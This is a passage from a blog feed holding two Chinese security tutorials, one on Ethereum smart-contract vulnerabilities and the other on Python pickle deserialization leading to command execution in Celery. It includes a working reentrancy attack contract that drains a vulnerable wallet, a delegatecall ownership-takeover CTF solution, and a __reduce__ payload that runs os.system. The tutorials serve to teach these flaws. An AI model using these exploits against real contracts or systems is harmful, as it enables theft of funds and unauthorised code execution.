余额</li><li>可以发送交易（transactions）</li><li>不包含相关执行代码</li></ul><p><strong>合约账户</strong></p><ul><li>拥有 ether 余额</li><li>含有执行代码</li><li>代码仅在该合约地址发生交易或者收到其他合约发送的信息时才会被执行</li><li>拥有自己的独立存储状态，且可以调用其他合约</li></ul><p>（这里留一个问题：“合约账户也有公私钥对吗？若有，那么允许直接用公私钥对控制账户以太坊余额吗？”）</p><p>简单来说就是合约账户由外部账户或合约代码逻辑进行创建，一旦部署成功，只能按照预先写好的合约逻辑进行业务交互，不存在其他方式直接操作合约账户或更改已部署的合约代码。</p><h4 id="2-代码执行限制"><a href="#2-代码执行限制" class="headerlink" title="2. 代码执行限制"></a>2. 代码执行限制</h4><p>在初识 Solidity 时需要注意的一些代码执行限制：</p><p>以太坊在设置时为了防止合约代码出现像 “死循环” 这样的情况，添加了代码执行消耗这一概念。合约代码部署到以太坊平台后，EVM 在执行这些代码时，每一步执行都会消耗一定 Gas，Gas 可以被看作是能量，一段代码逻辑可以假设为一套 “组合技”，而外部调用者在调用该合约的某一函数时会提供数量一定的 Gas，如果这些 Gas 大于这一套 “组合技” 所需的能量，则会成功执行，否则会由于 Gas 不足而发生 <code>out of gas</code> 的异常，合约状态回滚。</p><p><img src="/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilites-review/4.png" alt=""></p><p>同时在 Solidity 中，函数中递归调用栈（深度）不能超过 1024 层：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Some &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Loop</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        Loop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Loop() -&gt;</span></span><br><span class="line"><span class="comment">//  Loop() -&gt;</span></span><br><span class="line"><span class="comment">//    Loop() -&gt;</span></span><br><span class="line"><span class="comment">//      ...</span></span><br><span class="line"><span class="comment">//      ... (must less than 1024)</span></span><br><span class="line"><span class="comment">//      ...</span></span><br><span class="line"><span class="comment">//        Loop()</span></span><br></pre></td></tr></table></figure><h4 id="3-回退函数-fallback"><a href="#3-回退函数-fallback" class="headerlink" title="3. 回退函数 - fallback()"></a>3. 回退函数 - fallback()</h4><p>在跟进 Solidity 的安全漏洞时，有很大一部分都与合约实例的回退函数有关。那什么是回退函数呢？官方文档描述到：</p><blockquote><p>A contract can have exactly one unnamed function. This function cannot have arguments and cannot return anything. It is executed on a call to the contract if none of the other functions match the given function identifier (or if no data was supplied at all).</p></blockquote><p>fallback 函数在合约实例中表现形式即为一个不带参数没有返回值的匿名函数：</p><p><img src="/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilites-review/3.png" alt=""></p><p>那么什么时候会执行 fallback 函数呢？</p><ol><li>当外部账户或其他合约向该合约地址发送 ether 时；</li><li>当外部账户或其他合约调用了该合约一个<strong>不存在</strong>的函数时；</li></ol><p><strong>注：目前已知的关于 Solidity 的安全问题大多都会涉及到 fallback 函数</strong></p><h4 id="4-几种转币方法对比"><a href="#4-几种转币方法对比" class="headerlink" title="4. 几种转币方法对比"></a>4. 几种转币方法对比</h4><p>Solidity 中 <code>&lt;address&gt;.transfer()</code>，<code>&lt;address&gt;.send()</code> 和 <code>&lt;address&gt;.gas().call.vale()()</code> 都可以用于向某一地址发送 ether，他们的区别在于：</p><p><strong>&lt;address>.transfer()</strong></p><ul><li>当发送失败时会 <code>throw;</code> 回滚状态</li><li>只会传递 2300 Gas 供调用，防止重入（reentrancy）</li></ul><p><strong>&lt;address>.send()</strong></p><ul><li>当发送失败时会返回 <code>false</code> 布尔值</li><li>只会传递 2300 Gas 供调用，防止重入（reentrancy）</li></ul><p><strong>&lt;address>.gas().call.value()()</strong></p><ul><li>当发送失败时会返回 <code>false</code> 布尔值</li><li>传递所有可用 Gas 进行调用（可通过 <code>gas(gas_value)</code> 进行限制），不能有效防止重入（reentrancy）</li></ul><p><strong>注：开发者需要根据不同场景合理的使用这些函数来实现转币的功能，如果考虑不周或处理不完整，则极有可能出现漏洞被攻击者利用</strong></p><p>例如，早期很多合约在使用 <code>&lt;address&gt;.send()</code> 进行转帐时，都会忽略掉其返回值，从而致使当转账失败时，后续的代码流程依然会得到执行。</p><h4 id="5-require-和-assert，revert-与-throw"><a href="#5-require-和-assert，revert-与-throw" class="headerlink" title="5. require 和 assert，revert 与 throw"></a>5. require 和 assert，revert 与 throw</h4><p><code>require</code> 和 <code>assert</code> 都可用于检查条件，并在不满足条件的时候抛出异常，但在使用上 <code>require</code> 更偏向代码逻辑健壮性检查上；而在需要确认一些本不该出现的情况异常发生的时候，就需要使用 <code>assert</code> 去判断了。</p><p><code>revert</code> 和 <code>throw</code> 都是标记错误并恢复当前调用，但 Solidity 在 <code>0.4.10</code> 开始引入 <code>revert()</code>, <code>assert()</code>, <code>require()</code> 函数，用法上原先的 <code>throw;</code> 等于 <code>revert()</code>。</p><p>关于这几个函数详细讲解，可以参考<a href="https://medium.com/blockchannel/the-use-of-revert-assert-and-require-in-solidity-and-the-new-revert-opcode-in-the-evm-1a3a7990e06e" target="_blank" rel="noopener">文章</a>。</p><h3 id="II-漏洞现场还原"><a href="#II-漏洞现场还原" class="headerlink" title="II. 漏洞现场还原"></a>II. 漏洞现场还原</h3><p>历史上已经出现过很多关于以太坊合约的安全事件，这些安全事件在当时的影响也是巨大的，轻则让已部署的合约无法继续运行，重则会导致数千万美元的损失。在金融领域，是不允许错误出现的，但从侧面来讲，正是这些安全事件的出现，才促使了以太坊或者说是区块链安全的发展，越来越多的人关注区块链安全、合约安全、协议安全等。</p><p>所以，通过一段时间的学习，在这我将已经明白的关于以太坊合约的几个漏洞原理记录下来，有兴趣的可以进一步交流。</p><p>下面列出了已知的常见的 Solidity 的漏洞类型（来自于 <a href="https://www.dasp.co/" target="_blank" rel="noopener">DASP Top 10</a>）：</p><ol><li>Reentrancy - 重入</li><li>Access Control - 访问控制</li><li>Arithmetic Issues - 算术问题（整数上下溢出）</li><li>Unchecked Return Values For Low Level Calls - 未严格判断不安全函数调用返回值</li><li>Denial of Service - 拒绝服务</li><li>Bad Randomness - 可预测的随机处理</li><li>Front Running</li><li>Time manipulation</li><li>Short Address Attack - 短地址攻击</li><li>Unknown Unknowns - 其他未知</li></ol><p>下面我会按照 <code>原理</code> -&gt; <code>示例（代码）</code> -&gt; <code>攻击</code> 来对每一类型的漏洞进行原理说明和攻击方法的讲解。</p><h4 id="1-Reentrancy"><a href="#1-Reentrancy" class="headerlink" title="1. Reentrancy"></a>1. Reentrancy</h4><p>重入漏洞，在我刚开始看这个漏洞类型的时候，还是比较懵逼的，因为从字面上来看，“重入” 其实可以简单理解成 “递归” 的意思，那么在传统的开发语言里 “递归” 调用是一种很常见的逻辑处理方式，那在 Solidity 里为什么就成了漏洞了呢。在上面一部分也有讲到，在以太坊智能合约里有一些内在的执行限制，如 Gas Limit，来看下面这段代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract IDMoney &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) balances;  <span class="comment">// 记录每个打币者存入的资产情况</span></span><br><span class="line"></span><br><span class="line">    event withdrawLog(address, uint256);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">IDMoney</span>(<span class="params"></span>) </span>&#123; owner = msg.sender; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123; balances[msg.sender] += msg.value; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">address to, uint256 amount</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.sender] &gt; amount);</span><br><span class="line">        <span class="built_in">require</span>(<span class="keyword">this</span>.balance &gt; amount);</span><br><span class="line"></span><br><span class="line">        withdrawLog(to, amount);  <span class="comment">// 打印日志，方便观察 reentrancy</span></span><br><span class="line">        </span><br><span class="line">        to.call.value(amount)();  <span class="comment">// 使用 call.value()() 进行 ether 转币时，默认会发所有的 Gas 给外部</span></span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params"></span>) <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123; <span class="keyword">return</span> balances[msg.sender]; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address addr</span>) <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123; <span class="keyword">return</span> balances[addr]; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码是为了说明重入漏洞原理编写的，实现的是一个类似公共钱包的合约。任何人都可以向 <code>IDMoney</code> 存入相应的 Ether，合约会记录每个账户在该合约里的资产（Ether）情况，账户可以查询自身/他人在此合约中的余额，同时也能够通过 <code>withdraw</code> 将自己在合约中的 Ether 直接提取出来转给其他账户。</p><p>初识以太坊智能合约的人在分析上面这段代码时，应该会认为是一段比较正常的代码逻辑，似乎并没有什么问题。但是我在之前就说了，以太坊智能合约漏洞的出现其实跟自身的语法（语言）特性有很大的关系。这里，我们把焦点放在 <code>withdraw(address, uint256)</code> 函数中，合约在进行提币时，使用 <code>require</code> 依次判断提币账户是否拥有相应的资产和该合约是否拥有足够的资金可供提币（有点类似于交易所的提币判断），随后使用 <code>to.call.value(amount)();</code> 来发送 Ether，处理完成后相应修改用户资产数据。</p><p>仔细看过第一部分 I.3 的同学肯定发现了，这里转币的方法用的是 <code>call.value()()</code> 的方式，区别于 <code>send()</code> 和 <code>transfer()</code> 两个相似功能的函数，<code>call.value()()</code> 会将剩余的 Gas 全部给予外部调用（fallback 函数），而 <code>send()</code> 和 <code>transfer()</code> 只会有 <code>2300</code> 的 Gas 量来处理本次转币操作。如果在进行 Ether 交易时目标地址是个合约地址，那么默认会调用该合约的 fallback 函数（存在的情况下，不存在转币会失败，注意 payable 修饰）。</p><p>上面说了这么多，显然地，在提币或者说是合约用户在转币的过程中，存在一个递归 <code>withdraw</code> 的问题（因为资产修改在转币之后），攻击者可以部署一个包含恶意递归调用的合约将公共钱包合约里的 Ether 全部提出，流程大致是这样的：</p><p><img src="/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilites-review/6.png" alt=""></p><p><strong>（读者可以直接先根据上面的 <code>IDMoney</code> 合约代码写出自己的攻击合约代码，然后在测试环境中进行模拟）</strong></p><p>我实现的攻击合约代码如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    address victim;</span><br><span class="line"></span><br><span class="line">    modifier ownerOnly &#123; <span class="built_in">require</span>(owner == msg.sender); _; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Attack</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123; owner = msg.sender; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置已部署的 IDMoney 合约实例地址</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setVictim</span>(<span class="params">address target</span>) <span class="title">ownerOnly</span> </span>&#123; victim = target; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// deposit Ether to IDMoney deployed</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">step1</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.balance &gt; amount) &#123;</span><br><span class="line">            victim.call.value(amount)(bytes4(keccak256(<span class="string">"deposit()"</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// withdraw Ether from IDMoney deployed</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">step2</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        victim.call(bytes4(keccak256(<span class="string">"withdraw(address,uint256)"</span>)), <span class="keyword">this</span>, amount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// selfdestruct, send all balance to owner</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stopAttack</span>(<span class="params"></span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">startAttack</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        step1(amount);</span><br><span class="line">        step2(amount / <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (msg.sender == victim) &#123;</span><br><span class="line">            <span class="comment">// 再次尝试调用 IDCoin 的 sendCoin 函数，递归转币</span></span><br><span class="line">            victim.call(bytes4(keccak256(<span class="string">"withdraw(address,uint256)"</span>)), <span class="keyword">this</span>, msg.value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>remix-ide</code> 模拟攻击流程：</p><p><img src="/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilites-review/reentrancy_demo.gif" alt=""></p><p>著名导致以太坊硬分叉（ETH/ETC）的 <a href="https://blog.slock.it/the-history-of-the-dao-and-lessons-learned-d06740f8cfa5" target="_blank" rel="noopener">The DAO</a> 事件就跟重入漏洞有关，该事件导致 60 多万以太坊被盗。</p><h4 id="2-Access-Control"><a href="#2-Access-Control" class="headerlink" title="2. Access Control"></a>2. Access Control</h4><p>访问控制，在使用 Solidity 编写合约代码时，有几种默认的变量或函数访问域关键字：<code>private</code>, <code>public</code>, <code>external</code> 和 <code>internal</code>，对合约实例方法来讲，默认可见状态为 <code>public</code>，而合约实例变量的默认可见状态为 <code>private</code>。</p><ul><li>public 标记函数或变量可以被任何账户调用或获取，可以是合约里的函数、外部用户或继承该合约里的函数</li><li>external 标记的函数只能从外部访问，不能被合约里的函数直接调用，但可以使用 <code>this.func()</code> 外部调用的方式调用该函数</li><li>private 标记的函数或变量只能在本合约中使用（注：这里的限制只是在代码层面，以太坊是公链，任何人都能直接从链上获取合约的状态信息）</li><li>internal 一般用在合约继承中，父合约中被标记成 internal 状态变量或函数可供子合约进行直接访问和调用（外部无法直接获取和调用）</li></ul><p>Solidity 中除了常规的变量和函数可见性描述外，这里还需要特别提到的就是两种底层调用方式 <code>call</code> 和 <code>delegatecall</code>：</p><ul><li><code>call</code> 的外部调用上下文是外部合约</li><li><code>delegatecall</code> 的外部调用上下是调用合约上下文</li></ul><p>简单的用图表示就是：</p><p><img src="/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilites-review/7.png" alt=""></p><p>合约 A 以 <code>call</code> 方式调用外部合约 B 的 <code>func()</code> 函数，在外部合约 B 上下文执行完 <code>func()</code> 后继续返回 A 合约上下文继续执行；而当 A 以 <code>delegatecall</code> 方式调用时，相当于将外部合约 B 的 <code>func()</code> 代码复制过来（其函数中涉及的变量或函数都需要存在）在 A 上下文空间中执行。</p><p>下面代码是 OpenZeppelin CTF 中的题目：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delegate</span>(<span class="params">address _owner</span>) </span>&#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delegation</span>(<span class="params">address _delegateAddress</span>) </span>&#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (delegate.delegatecall(msg.data)) &#123;</span><br><span class="line">            <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细分析代码，合约 Delegation 在 fallback 函数中使用 <code>msg.data</code> 对 Delegate 实例进行了 <code>delegatecall()</code> 调用。<code>msg.data</code> 可控，这里攻击者直接用 <code>bytes4(keccak256(&quot;pwn()&quot;))</code> 即可通过 <code>delegatecall()</code> 将已部署的 Delegation <code>owner</code> 修改为攻击者自己（msg.sender）。</p><p>使用 <code>remix-ide</code> 模拟攻击流程：</p><p><img src="/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilites-review/delegatecall_demo.gif" alt=""></p><p>2017 年下半年出现的智能合约钱包 Parity 被盗事件就跟未授权和 <code>delegatecall</code> 有关。</p><p><strong>（注：本文上部主要讲解了以太坊智能合约安全的研究基础和两类漏洞原理实例，在<a href="http://rickgray.me/2018/05/26/ethereum-smart-contracts-vulnerabilities-review-part2/#3-Arithmetic-Issues">《以太坊智能合约安全入门了解一下（下）》</a>中会补全其他几类漏洞的原理讲解，并有一小节 “自我思考” 来总结我在学习和研究以太坊智能合约安全时遇到的细节问题）</strong></p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul><li><a href="http://solidity.readthedocs.io/en/v0.4.21/contracts.html#fallback-function" target="_blank" rel="noopener">http://solidity.readthedocs.io/en/v0.4.21/contracts.html#fallback-function</a></li><li><a href="https://consensys.github.io/smart-contract-best-practices/recommendations/#be-aware-of-the-tradeoffs-between-send-transfer-and-callvalue" target="_blank" rel="noopener">https://consensys.github.io/smart-contract-best-practices/recommendations/#be-aware-of-the-tradeoffs-between-send-transfer-and-callvalue</a></li><li><a href="http://www.cryptologie.net/" target="_blank" rel="noopener">http://www.cryptologie.net/</a></li><li><a href="https://ethereum.stackexchange.com/questions/7570/whats-a-fallback-function-when-using-address-send" target="_blank" rel="noopener">https://ethereum.stackexchange.com/questions/7570/whats-a-fallback-function-when-using-address-send</a></li><li><a href="https://www.dasp.co/" target="_blank" rel="noopener">https://www.dasp.co/</a></li><li><a href="https://www.youtube.com/playlist?list=PLUMwusiHZZhpf8ItZBkR95ekkMGNKvuNR" target="_blank" rel="noopener">https://www.youtube.com/playlist?list=PLUMwusiHZZhpf8ItZBkR95ekkMGNKvuNR</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;（注：本文分上/下两部分完成）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;最近区块链漏洞不要太火，什么交易所用户被钓鱼导致 APIKEY 泄漏，代币合约出现整数溢出漏洞致使代币归零， MyEtherWallet 遭 DNS 劫持致使用户 ETH 被盗等等。频频爆出的区
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="ethereum" scheme="http://rickgray.me/tags/ethereum/"/>
    
      <category term="blockchain" scheme="http://rickgray.me/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>漏洞组合拳 - 攻击分布式节点</title>
    <link href="http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/"/>
    <id>http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/</id>
    <published>2016-09-21T16:00:00.000Z</published>
    <updated>2016-09-21T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>分布式系统大都需要依赖于<strong>消息队列中间件</strong>来解决异步处理、应用耦合等问题，<strong>消息队列中间件</strong>的选择又依赖于整体系统的设计和实现，消息的<strong>封装</strong>、<strong>传递</strong>、<strong>处理</strong>贯穿了整个系统，如果在某一个关键处理逻辑点上出现了安全问题，那么整个分布式节点都有可能受到破坏。</p><p>流行的开发语言几乎都存在序列化处理不当导致的命令执行问题，如 Python 里类的魔术方法 <code>__reduce__()</code> 会在 pickle 库进行反序列化的时候进行调用，PHP 中类的魔术方法 <code>__wakup()</code> 同样也会在实例进行反序列化的时候调用等等。</p><p>从开发者角度看来，开发语言提供的数据序列化方式方便了实例对象进行跨应用传递，<strong>程序A</strong> 和 <strong>程序B</strong> 能够通过序列化数据传递方式来<strong>远程访问实例对象</strong>或者<strong>远程调用方法</strong>（如 Java 中的 RMI）；而站在安全研究者角度，这种跨应用的数据传递或者调用方式可能存在对象数据篡改和方法恶意调用的安全隐患。</p><p>在消息队列的实现中，消息数据的序列化（封装）方式就成了一颗定时炸弹，不安全的序列化方式可能会导致消息数据被篡改，从而引发反序列化（数据解析）后的一些列安全问题。</p><p>消息队列中间件的选择也是一大问题，常见的有 RabbitMQ，ActiveMQ，Kafka，Redis 等，而像 Redis 这种存在未授权访问问题的组件如果被攻击者所控制，即可通过组件直接向消息队列中插入数据，轻则影响整个分布式节点的逻辑处理，重则直接插入恶意数据结合反序列化等问题对节点群进行攻击。</p><p>说了这么多，总结一下上面提到的几个安全问题：</p><ol><li>各语言中存在的序列化问题可直接导致远程命令执行；</li><li>消息队列的实现常常会直接使用语言自身的序列化（或相似的）方式封装消息；</li><li>分布式系统使用的消息队列中间件种类繁多，其中某些分布式框架使用了像 Redis 这种存在着<strong>未授权访问</strong>问题的组件；</li><li>消息队列中消息的篡改会直接或间接影响到分布式节点；</li></ol><p>将这 4 个安全问题或者说是漏洞结合在一起，即可成为一种可直接入侵和破坏分布式节点的攻击方法。那么，是否存在真正满足上述问题的实例呢？目前，已经发现了 Python 中 Celery 分布式框架确实存在这样的问题，下面我会针对上诉 4 个问题以 Celery 分布式框架为例来说明如何攻击分布式节点打出漏洞组合拳。</p><h3 id="一、老生常谈-Python-序列化"><a href="#一、老生常谈-Python-序列化" class="headerlink" title="一、老生常谈 Python 序列化"></a>一、老生常谈 Python 序列化</h3><p>Celery 分布式框架是由 Python 语言所编写的，为了下面更好的说明问题，所以这里首先简单的回顾一下 Python 序列化的安全问题。</p><h4 id="1-简单的序列化例子"><a href="#1-简单的序列化例子" class="headerlink" title="1. 简单的序列化例子"></a>1. 简单的序列化例子</h4><p>Python 中有这么一个名为 <code>pickle</code> 的模块用于实例对象的序列化和反序列化，一个简单的例子：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObj</span><span class="params">(object)</span>:</span></span><br><span class="line">    loa = <span class="string">'hello my object'</span></span><br><span class="line">    </span><br><span class="line">t_obj = MyObj()</span><br><span class="line">serialized = base64.b64encode(pickle.dumps(t_obj))</span><br><span class="line">print(<span class="string">'--&gt; pickling MyObj instance &#123;&#125; and Base64 it\ngot "&#123;&#125;"'</span>.format(t_obj, serialized))</span><br><span class="line">print(<span class="string">'--&gt; unpickling serialized data\nwith "&#123;&#125;"'</span>.format(serialized))</span><br><span class="line">obj = pickle.loads(base64.b64decode(serialized))</span><br><span class="line">print(<span class="string">'** unpickled object is &#123;&#125;'</span>.format(obj))</span><br><span class="line">print(<span class="string">'&#123;&#125; -&gt; loa = &#123;&#125;'</span>.format(obj, obj.loa))</span><br></pre></td></tr></table></figure><p>因 <code>pickle</code> 模块对实例对象进行序列化时产生的是二进制结构数据，传输的时候常常会将其进行 Base64 编码，这样可以有效地防止字节数据丢失。上面的程序作用是将一个 <code>MyObj</code> 类实例进行序列化并进行 Base64 编码然后进行解码反序列化重新得到实例的一个过程，运行程序后得到输出：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/1.png" alt=""></p><p>通过截图可以看到序列化前和序列化后的实例是不同的（对象地址不同），并且通常反序列化时实例化一个类实例，当前的运行环境首先必须定义了该类型才能正常序列化，否则可能会遇到找不到正确类型无法进行反序列化的情况，例如将上诉过程分文两个文件 <code>serializer.py</code> 和 <code>unserializer.py</code>，前一个文件用于实例化 <code>MyObj</code> 类并将其序列化然后经 Base64 编码输出，而后一个文件用于接收一串字符串，将其 Base64 解码后进行反序列化：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># serializer.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObj</span><span class="params">(object)</span>:</span></span><br><span class="line">    loa = <span class="string">'hello my object'</span></span><br><span class="line">print(base64.b64encode(pickle.dumps(MyObj())))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># unserializer.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">print(pickle.loads(base64.b64decode(sys.argv[<span class="number">1</span>])))</span><br></pre></td></tr></table></figure><p>就上面所说，在反序列化时如果环境中不存在反序列化类型的定义，因为 <code>unserializer.py</code> 中未定义 <code>MyObj</code> 类，则在对 <code>serializer.py</code> 输出结果进行反序列化时会失败报错，提示找不到 <code>MyObj</code>：</p><p><img src="/images/articles/2016-09-22-attacking-distributed-nodes-by-message-queue-injection/2.png" alt=""></p><h4 id="2-Trick-使得反序列化变得危险"><a href="#2-Trick-使得反序列化变得危险" class="headerlink" title="2. Trick 使得反序列化变得危险"></a>2. Trick 使得反序列化变得危险</h4><p>看似反序列化并不能实例化任意对象（运行环境依赖），但有那么些 tricks 可以达到进行反序列化即可任意代码执行的效果。</p><p>如果一个类定义了 <code>__reduce__()</code> 函数，那么在对其实例进行反序列化的时候，<code>pickle</code> 会通过 <code>__reduce__()</code> 函数去寻找正确的重新类实例化过程。（<code>__reduce__()</code> 函数<a href="https://docs.python.org/2/library/pickle.html#object.__reduce__" target="_blank" rel="noopener">详细文档参考</a>）</p><p>例如这里我在 <code>MyObj</code> 类中定义 <code>__reduce__()</code> 函数：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObj</span><span class="params">(object)</span>:</span></span><br><span class="line">    loa = <span class="string">'hello my object'</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (str, (<span class="string">'replaced by __reduce__() method'</span>, ))</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>然后再执行上一节的程序过程，会直接得到输出：</p><p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/3.png" alt=""></p><p>这里不再报错是因为，<code>MyObj</code> 在进行序列化的时候，将重新构建类的过程写进了序列化数据里，<code>pickle</code> 在进行反序列化的时候会遵循重建过程去执行相应操作，这里是使用内置的 <code>str</code> 函数去操作参数 <code>&#39;replaced by __reduce__() method&#39;</code> 并返回，所以成功反序列化并输出的字符串。</p><p>有了 <code>__reduce__()</code> 这个函数，就可以利用该特性在反序列化的时候直接执行任意代码了，如下示例代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># evil.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CMD</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">'whoami'</span>, ))</span><br><span class="line">print(base64.b64encode(pickle.dumps(CMD())))</span><br></pre></td></tr></table></figure><p>运行得到编码后的序列化数据：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Y3Bvc2l4CnN5c3RlbQpwMAooUyd3aG9hbWknCnAxCnRwMgpScDMKLg==</span><br></pre></td></tr></table></figure><p>这里需要主要的是 <code>os.system(&#39;whoami&#39;)</code> 这个过程不是在序列化过程执行的，而是将这个过程以结构化的数据存于了序列化数据中，这里可以看一下二进制序列化数据：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  demo echo -n &quot;Y3Bvc2l4CnN5c3RlbQpwMAooUyd3aG9hbWknCnAxCnRwMgpScDMKLg==&quot; | base64 -D | xxd</span><br><span class="line">0000000: 6370 6f73 6978 0a73 7973 7465 6d0a 7030  cposix.system.p0</span><br><span class="line">0000010: 0a28 5327 7768 6f61 6d69 270a 7031 0a74  .(S&apos;whoami&apos;.p1.t</span><br><span class="line">0000020: 7032 0a52 7033 0a2e                      p2.Rp3..</span><br><span class="line">➜  demo</span><br></pre></td></tr></table></figure><p>数据都是以 Python <code>pickle</code> 序列化数据结构进行整合的，具体底层协议实现可参考官方文档。</p><p>对上面的序列化数据使用 <code>unserializer.py</code> 进行反序列化操作时，会触发类重构操作，从而执行 <code>os.system(&#39;whoami&#39;)</code>：</p><p><img 